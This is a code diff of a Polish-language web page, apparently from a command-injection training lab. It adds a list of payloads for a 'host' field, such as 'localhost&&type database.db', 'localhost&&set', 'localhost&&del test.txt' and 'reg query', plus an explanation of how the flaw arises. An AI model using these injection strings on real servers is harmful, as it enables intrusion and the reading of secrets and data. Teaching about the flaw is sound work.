@@ -41,19 +41,118 @@
         <q-card style="max-width: 600px">
           <q-card-section>
             <p>Spróbuj w polu host użyć payloadu generującego błąd:</p>
+            <p>Spróbuj w polu host użyć payloadu generującego błąd lub wykonującego komendy systemowe:</p>
             <ul>
               <li>
                 <code>localhost&&dir</code>
-                <p>➡️ Zwróci listę plików w katalogu, jeśli serwer pozwala na komendy shellowe.</p>
+                <p>➡️ Zwróci listę plików w katalogu, jeśli serwer pozwala na wykonanie komend shellowych.</p>
               </li>
               <li>
                 <pre><code>localhost&&type database.db</code></pre>
-                <p>Zwroc zawartosc database.db</p>
+                <p>➡️ Zwróci zawartość pliku <code>database.db</code>.</p>
+              </li>
+              <li>
+                <code>localhost&&ping 127.0.0.1 -n 3</code>
+                <p>➡️ Wykonuje ping do lokalnego hosta 3 razy, co może opóźnić odpowiedź serwera (test opóźnienia).</p>
+              </li>
+              <li>
+                <code>localhost&&ipconfig</code>
+                <p>➡️ Wyświetla konfigurację sieciową maszyny, na której działa serwer.</p>
+              </li>
+              <li>
+                <code>localhost&&tasklist</code>
+                <p>➡️ Pokazuje listę uruchomionych procesów systemu Windows.</p>
+              </li>
+              <li>
+                <code>localhost&&set</code>
+                <p>➡️ Wyświetla wszystkie zmienne środowiskowe serwera.</p>
+              </li>
+              <li>
+                <code>localhost&&echo test > test.txt</code>
+                <p>➡️ Tworzy plik <code>test.txt</code> z zawartością <code>test</code> w katalogu, z którego działa
+                  serwer.</p>
+              </li>
+              <li>
+                <code>localhost&&del test.txt</code>
+                <p>➡️ Usuwa plik <code>test.txt</code> (jeśli istnieje).</p>
+              </li>
+              <li>
+                <code>localhost&&dir %TEMP%</code>
+                <p>➡️ Wyświetla zawartość katalogu tymczasowego użytkownika serwera.</p>
+              </li>
+              <li>
+                <code>localhost&&cd</code>
+                <p>➡️ Pokazuje aktualny katalog roboczy serwera.</p>
+              </li>
+              <li>
+                <code>localhost&&ping 127.0.0.1 -n 6 > nul</code>
+                <p>➡️ Opóźnia odpowiedź serwera o około 5 sekund (ping 6 razy, ignorując wyjście).</p>
+              </li>
+              <li>
+                <code>localhost&&dir | findstr .txt</code>
+                <p>➡️ Wyświetla tylko pliki z rozszerzeniem <code>.txt</code> w katalogu (przez filtr
+                  <code>findstr</code>).
+                </p>
+              </li>
+              <li>
+                <code>localhost&&start calc.exe</code>
+                <p>➡️ Próba uruchomienia kalkulatora Windows (jeśli serwer ma GUI i pozwala na to).</p>
+              </li>
+              <li>
+                <code>localhost&&whoami</code>
+                <p>➡️ Pokazuje nazwę użytkownika, pod którym działa serwer.</p>
+              </li>
+              <li>
+                <code>localhost&&reg query HKLM\Software</code>
+                <p>➡️ Wyświetla klucze rejestru Windows (potrzebne odpowiednie uprawnienia).</p>
+              </li>
+              <li>
+                <code>localhost&&powershell Get-Process</code>
+                <p>➡️ Uruchamia polecenie PowerShell i wyświetla listę procesów.</p>
               </li>
             </ul>
+
           </q-card-section>
         </q-card>
       </q-expansion-item>
+
+      <q-expansion-item expand-separator icon="bug_report" label="Kiedy pojawia się podatność na Command Injection?">
+        <q-card style="max-width: 600px">
+          <q-card-section>
+            <p>Podatność na <strong>Command Injection</strong> pojawia się, gdy aplikacja wykonuje polecenia systemowe z
+              niewystarczająco zabezpieczonych danych wejściowych użytkownika. Przykłady:</p>
+            <ul>
+              <li>
+                <strong>Przyjmowanie nazwy hosta lub adresu IP do pingowania:</strong>
+                <br>np. pole <code>host</code> w formularzu, które jest bezpośrednio przekazywane do komendy shellowej
+                typu <code>ping {host}</code>.
+              </li>
+              <li>
+                <strong>Przesyłanie nazwy pliku do wyświetlenia zawartości:</strong>
+                <br>np. <code>type {filename}</code> lub <code>cat {filename}</code> bez filtrowania, co pozwala na
+                dołączenie dodatkowych komend.
+              </li>
+              <li>
+                <strong>Generowanie raportów lub backupów z parametrami użytkownika:</strong>
+                <br>np. wykonywanie <code>tar -czf backup.tar.gz {directory}</code> gdzie <code>{directory}</code>
+                pochodzi od użytkownika i można dodać operator `;` lub `&&` do wykonania kolejnych poleceń.
+              </li>
+              <li>
+                <strong>Uruchamianie poleceń systemowych na podstawie danych z API lub URL:</strong>
+                <br>np. endpoint, który przyjmuje parametr i bezpośrednio przekazuje go do shell'a, np.
+                <code>system("ls " + param)</code>.
+              </li>
+              <li>
+                <strong>Brak sanitacji i escapowania znaków specjalnych takich jak ; & | ` $ ( )</strong>, które
+                umożliwiają dołączenie dodatkowych poleceń.
+              </li>
+            </ul>
+            <p>Wszystkie te przypadki mogą skutkować wykonaniem nieautoryzowanych komend, np. pobraniem plików,
+              modyfikacją danych lub nawet przejęciem serwera.</p>
+          </q-card-section>
+        </q-card>
+      </q-expansion-item>
+
 
       <q-expansion-item expand-separator icon="warning" label="Dlaczego jest to niebezpieczne?">
         <q-card style="max-width: 600px">
